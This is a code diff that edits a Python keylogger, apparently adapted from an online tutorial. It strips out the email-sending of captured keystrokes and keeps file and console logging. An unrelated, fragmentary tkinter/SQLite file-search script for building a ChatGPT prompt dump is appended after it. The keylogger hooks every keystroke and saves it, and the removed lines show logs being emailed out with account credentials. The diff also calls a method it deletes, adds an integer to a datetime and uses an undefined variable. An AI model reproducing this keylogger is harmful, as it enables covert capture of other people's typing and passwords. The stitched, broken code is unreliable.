@@ -1,19 +1,9 @@
 # Reference: https://thepythoncode.com/article/write-a-keylogger-python
 
 import keyboard # for keylogs
-import smtplib  # for sending email using SMTP protocol (gmail)
-# Timer is to make a method runs after an `interval` amount of time
-import time
-# from threading import Timer
 from datetime import datetime
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
 
 SEND_REPORT_EVERY = 15 # in seconds, 60 means 1 minute and so on
-EMAIL_ADDRESS = "email@provider.tld"
-EMAIL_PASSWORD = "password_here"
-
-
 
 class Keylogger:
     def __init__(self, interval, report_method="file"):
@@ -24,8 +14,8 @@ class Keylogger:
         # the keystrokes within `self.interval`
         self.log = ""
         # record start & end datetimes
-        self.start_dt = datetime.now()
-        self.end_dt = datetime.now()
+        self.starting = datetime.now()
+        self.ending = datetime.now() + SEND_REPORT_EVERY
 
     def callback(self, event):
         # This callback is invoked whenever a keyboard event is occured
@@ -49,17 +39,11 @@ class Keylogger:
         # finally, add the key name to our global `self.log` variable
         self.log += name
 
-    def update_filename(self):
-            # construct the filename to be identified by start & end datetimes
-            start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
-            end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
-            self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
-
     def report_to_file(self):
         # This method creates a log file in the current directory that contains
         # the current keylogs in the `self.log` variable
         # open the file in write mode (create it)
-        with open(f"{self.filename}.txt", "w") as f:
+        with open(f"{self.filename}.txt", "a") as f:
             # write the keylogs to the file
             print(self.log, file=f)
         print(f"[+] Saved {self.filename}.txt")
@@ -69,16 +53,14 @@ class Keylogger:
             # It basically sends keylogs and resets `self.log` variable
             if self.log:
                 # if there is something in log, report it
-                self.end_dt = datetime.now()
+                self.ending = datetime.now() + SEND_REPORT_EVERY
                 # update `self.filename`
                 self.update_filename()
-                if self.report_method == "email":
-                    self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
-                elif self.report_method == "file":
+                if self.report_method == "file":
                     self.report_to_file()
                 # if you don't want to print in the console, comment below line
-                # print(f"[{self.filename}] - {self.log}")
-                self.start_dt = datetime.now()
+                print(f"[{self.filename}] - {self.log}")
+                self.starting = datetime.now()
             self.log = ""
            # timer = Timer(interval=self.interval, function=self.report)
             # set the thread as daemon (dies when main thread die)
@@ -105,3 +87,74 @@ if __name__ == "__main__":
     # (and then send it using your favorite method)
     keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
 keylogger.start()
+
+
+
+
+
+
+
+'''
+1. PUT dixie.py ONE STEP ABOVE THE FOLDER(s) WHERE YOU HAVE FILES TO COMPILE.
+2. RUN dixie.py.
+3. ENTER THE NAMES OF THE FILES YOU WANT TO SEARCH FOR, SEPARATED BY COMMAS (e.g., cont.html, jessie.py, random.js).
+4. A TEXT FILE "file_contents.txt" WILL BE GENERATED THAT YOU CAN USE TO CONVERSE IN CODE WITH ChatGPT.
+'''
+
+import os
+import tkinter as tk
+from tkinter import messagebox
+import sqlite3
+
+# Connect to the SQLite database file
+db_file_path = os.path.join(os.getcwd(), 'file_search.db')
+conn = sqlite3.connect(db_file_path)
+cursor = conn.cursor()
+
+# Create the table if it doesn't exist
+cursor.execute('''CREATE TABLE IF NOT EXISTS search_history
+                  (folder_name TEXT, file_names TEXT)''')
+conn.commit()
+
+
+
+
+
+def write_contents_to_file(file_contents):
+    """
+    Writes the contents of the files to a text file named 'file_contents.txt'.
+    Each file's content is preceded by the file name.
+    """
+    file_path = os.path.join(os.getcwd(), 'file_contents.txt')
+    with open(file_path, 'w') as f:
+        f.write("***Codebase:")
+        for file, content in file_contents.items():
+            f.write(f"\n\n**{file}:-\n{content.strip()}")
+
+
+
+
+
+
+
+window = tk.Tk()
+window.title("File Search")
+window.geometry("600x200")  # Adjusted the window size
+
+
+
+
+
+
+
+# Entry field for file names
+entry = tk.Entry(window, width=60)
+entry.insert(0, entry_text)
+entry.pack(pady=10)
+
+
+
+window.mainloop()
+
+# Close the connection to the SQLite database
+conn.close()
